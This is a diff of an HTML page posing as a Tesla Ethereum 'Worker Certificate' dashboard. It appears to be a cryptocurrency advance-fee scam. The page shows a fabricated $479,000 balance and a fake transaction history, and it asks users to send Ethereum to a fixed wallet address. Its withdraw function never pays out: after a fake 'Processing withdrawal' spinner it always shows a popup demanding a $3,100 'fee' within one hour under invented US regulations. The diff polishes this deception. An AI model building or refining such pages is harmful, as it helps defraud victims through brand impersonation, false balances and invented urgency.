@@ -3,88 +3,103 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Tesla ETH Worker Dashboard</title>
+  <title>TESLA Worker Certificate</title>
   <script src="https://cdn.tailwindcss.com"></script>
   <script src="https://cdnjs.cloudflare.com/ajax/libs/axios/1.4.0/axios.min.js"></script>
   <script src="https://cdn.jsdelivr.net/npm/qrcode/build/qrcode.min.js"></script>
 </head>
-<body class="bg-black text-white font-sans">
+<body class="bg-gray-900 text-white font-sans">
 
   <div class="flex">
     <!-- Sidebar -->
-    <aside class="w-64 bg-black p-6 border-r border-gray-800">
+    <aside class="w-64 bg-red-900 p-6 border-r border-red-800">
       <div class="text-center mb-8">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/e/e8/Tesla_logo.png" alt="Tesla Logo" class="mx-auto w-12" />
-        <h1 class="text-xl font-bold mt-2">Tesla</h1>
-        <p class="text-sm text-gray-400">ETH Worker Dashboard</p>
+        <img src="https://upload.wikimedia.org/wikipedia/commons/e/e8/Tesla_logo.png" alt="Tesla Logo" class="mx-auto mb-2 w-16 h-16" />
+        <h1 class="text-3xl font-bold text-white uppercase tracking-wide">TESLA</h1>
+        <p class="text-xs text-gray-300 mt-2">Worker Certificate Portal</p>
       </div>
       <div class="space-y-4">
-        <button onclick="showSection('fund')" class="w-full bg-red-600 text-white py-2 rounded-full">Fund Your Account</button>
-        <button onclick="showSection('withdraw')" class="w-full bg-red-600 text-white py-2 rounded-full">Withdraw</button>
+        <button onclick="showSection('fund')" class="w-full bg-red-600 text-white py-2 rounded-full hover:bg-red-700 transition">Fund Account</button>
+        <button onclick="showSection('withdraw')" class="w-full bg-red-800 text-white py-2 rounded-full hover:bg-red-700 transition">Withdraw</button>
+      </div>
+      <div class="mt-10 text-white text-sm uppercase space-y-2">
+        <p>United States of America Standards</p>
+        <p>TESLA Worker Certificate</p>
       </div>
     </aside>
 
     <!-- Main Content -->
-    <main class="flex-1 p-8">
+    <main class="flex-1 p-8 bg-gray-800">
+      <!-- Header -->
+      <div class="flex items-center justify-between mb-6">
+        <div>
+          <h2 class="text-xl text-gray-300">Current Balance</h2>
+          <p class="text-5xl font-extrabold text-white">$479,000</p>
+          <p class="text-lg text-blue-400 font-bold mt-2">ETHEREUM</p>
+        </div>
+        <div class="flex items-center space-x-4">
+          <div class="text-right">
+            <p class="text-lg font-semibold">Elon Tesla-Worker</p>
+            <span class="text-xs text-gray-400 uppercase">Certified</span>
+          </div>
+          <img src="https://www.gravatar.com/avatar?d=mp&s=100" alt="User Profile" class="w-16 h-16 rounded-full border-2 border-red-600" />
+        </div>
+      </div>
+
       <!-- ETH Price -->
       <div class="mb-6">
-        <h2 class="text-2xl font-bold mb-2">Real-Time ETH Price</h2>
+        <h2 class="text-2xl font-bold mb-2">Ethereum Price</h2>
         <p id="ethPrice" class="text-lg text-green-400">Loading...</p>
       </div>
 
       <!-- Fund Section -->
       <section id="fundSection" class="hidden">
-        <h2 class="text-xl font-bold mb-4">Fund Your Account</h2>
-        <p class="mb-2">Available Balance: <strong>$479,000.00 USD</strong></p>
-        <p class="mb-2">Send ETH to:</p>
-        <p class="font-mono bg-gray-900 p-2 rounded mb-4">0xDf3c635c54765EC040eC323B95BC0FBc7F27a142</p>
-        <div id="qrcode" class="mb-4"></div>
+        <h2 class="text-xl font-bold mb-4">Fund Account</h2>
+        <p class="mb-2">Send Ethereum to:</p>
+        <p class="font-mono bg-gray-700 p-2 rounded mb-4">0xDf3c635c54765EC040eC323B95BC0FBc7F27a142</p>
+        <div id="qrcode" class="mb-6"></div>
       </section>
 
       <!-- Withdraw Section -->
       <section id="withdrawSection" class="hidden">
         <h2 class="text-xl font-bold mb-4">Withdraw</h2>
-        <p class="mb-2">Available Balance: <strong>$479,000.00 USD</strong></p>
-        <div class="flex space-x-4 mb-4">
-          <button onclick="showWithdrawMethod('bank')" class="bg-gray-800 px-4 py-2 rounded">Bank</button>
-          <button onclick="showWithdrawMethod('crypto')" class="bg-gray-800 px-4 py-2 rounded">Crypto</button>
-        </div>
-        <div id="bankWithdraw" class="hidden space-y-2">
-          <input type="text" placeholder="Bank Name" class="w-full bg-gray-900 p-2 rounded" />
-          <input type="text" placeholder="Account Number" class="w-full bg-gray-900 p-2 rounded" />
-          <input type="text" placeholder="Amount (USD)" class="w-full bg-gray-900 p-2 rounded" />
-          <button onclick="startWithdraw()" class="bg-red-600 px-4 py-2 rounded">Confirm</button>
-        </div>
-        <div id="cryptoWithdraw" class="hidden space-y-2">
-          <input type="text" placeholder="Wallet Address" class="w-full bg-gray-900 p-2 rounded" />
-          <input type="text" placeholder="Amount (ETH)" class="w-full bg-gray-900 p-2 rounded" />
-          <button onclick="startWithdraw()" class="bg-red-600 px-4 py-2 rounded">Confirm</button>
+        <div class="space-y-2">
+          <input id="walletInput" type="text" placeholder="Wallet Address" class="w-full bg-gray-700 p-2 rounded" />
+          <input id="amountInput" type="text" placeholder="Amount (ETH)" class="w-full bg-gray-700 p-2 rounded" />
+          <button onclick="startWithdraw()" class="bg-red-600 px-4 py-2 rounded hover:bg-red-700 transition">Confirm</button>
         </div>
       </section>
 
       <!-- Transaction History -->
       <section class="mt-10">
         <h2 class="text-xl font-bold mb-4">Transaction History</h2>
-        <ul class="space-y-2">
-          <li class="bg-gray-900 p-2 rounded">[08/29/2025] Deposit +$32,000.00</li>
-          <li class="bg-gray-900 p-2 rounded">[08/28/2025] Withdrawal -$30,000.00</li>
-          <li class="bg-gray-900 p-2 rounded">[08/27/2025] Deposit +$35,000.00</li>
-          <li class="bg-gray-900 p-2 rounded">[08/26/2025] Withdrawal -$31,500.00</li>
-          <li class="bg-gray-900 p-2 rounded">[08/25/2025] Deposit +$40,000.00</li>
-          <li class="bg-gray-900 p-2 rounded">[08/24/2025] Withdrawal -$33,500.00</li>
-        </ul>
+        <div class="max-h-64 overflow-y-auto space-y-2 pr-2">
+          <li class="bg-gray-700 p-2 rounded">[08/29/2025] Deposit +32.10 ETH</li>
+          <li class="bg-gray-700 p-2 rounded">[08/28/2025] Withdrawal -30.00 ETH</li>
+          <li class="bg-gray-700 p-2 rounded">[08/27/2025] Deposit +32.32 ETH</li>
+          <li class="bg-gray-700 p-2 rounded">[08/26/2025] Withdrawal -33.10 ETH</li>
+          <li class="bg-gray-700 p-2 rounded">[08/25/2025] Deposit +48.85 ETH</li>
+        </div>
       </section>
     </main>
   </div>
 
+  <!-- Spinning Loading Modal -->
+  <div id="loadingModal" class="fixed top-0 left-0 w-full h-full bg-black bg-opacity-70 flex items-center justify-center hidden z-50">
+    <div class="flex flex-col items-center bg-gray-800 p-8 rounded-lg border border-red-400">
+      <div class="animate-spin rounded-full h-16 w-16 border-t-4 border-red-500 border-b-4"></div>
+      <h3 class="text-white text-lg font-semibold mt-4">Processing withdrawal...</h3>
+    </div>
+  </div>
+
   <!-- Error Popup -->
-  <div id="errorPopup" class="fixed top-0 left-0 w-full h-full bg-black bg-opacity-80 flex items-center justify-center hidden">
-    <div class="bg-gray-900 p-6 rounded-lg text-center max-w-md">
-      <h3 class="text-red-500 text-xl font-bold mb-2">$3,100 ETHEREUM Required</h3>
-      <p class="text-sm mb-4">The payment must be made within one hour, following United States standards. Non-payment may lead to removal from Tesla's Ethereum stakeholders. We strongly recommend paying the amount to ensure compliance and avoid penalties.</p>
-      <p class="text-sm mb-4">Payment Address:</p>
-      <p class="font-mono bg-gray-800 p-2 rounded mb-4">0xDf3c635c54765EC040eC323B95BC0FBc7F27a142</p>
-      <button onclick="closePopup()" class="bg-red-600 px-4 py-2 rounded">OK</button>
+  <div id="errorPopup" class="fixed top-0 left-0 w-full h-full bg-black bg-opacity-80 flex items-center justify-center hidden z-50">
+    <div class="bg-gray-800 p-6 rounded-lg text-center max-w-md border border-yellow-400">
+      <h3 class="text-yellow-400 text-xl font-bold mb-2">$3,100 Ethereum Fee Required</h3>
+      <p class="text-sm mb-4">A fee is required by United States of America cryptocurrency regulations and must be paid within one hour. Failure to pay may result in penalties.</p>
+      <p class="text-sm mb-2">Fee Address:</p>
+      <p class="font-mono bg-gray-700 p-2 rounded mb-4">0xDf3c635c54765EC040eC323B95BC0FBc7F27a142</p>
+      <button onclick="closePopup()" class="bg-red-600 px-4 py-2 rounded hover:bg-red-700 transition">OK</button>
     </div>
   </div>
 
@@ -95,20 +110,12 @@
       document.getElementById('withdrawSection').style.display = section === 'withdraw' ? 'block' : 'none';
     }
 
-    function showWithdrawMethod(method) {
-      document.getElementById('bankWithdraw').style.display = method === 'bank' ? 'block' : 'none';
-      document.getElementById('cryptoWithdraw').style.display = method === 'crypto' ? 'block' : 'none';
-    }
-
     function startWithdraw() {
-      let progress = 0;
-      const interval = setInterval(() => {
-        progress++;
-        if (progress >= 99) {
-          clearInterval(interval);
-          document.getElementById('errorPopup').style.display = 'flex';
-        }
-      }, 220); // 22 seconds total
+      document.getElementById('loadingModal').style.display = 'flex';
+      setTimeout(() => {
+        document.getElementById('loadingModal').style.display = 'none';
+        document.getElementById('errorPopup').style.display = 'flex';
+      }, 5000); // 5 seconds
     }
 
     function closePopup() {
@@ -128,7 +135,7 @@
     fetchETHPrice();
     setInterval(fetchETHPrice, 10000); // Update every 10 seconds
 
-    // QR Code Generation
+    // QR Code Generation for Ethereum address
     QRCode.toCanvas(document.getElementById("qrcode"), "0xDf3c635c54765EC040eC323B95BC0FBc7F27a142", function (error) {
       if (error) console.error(error);
     });
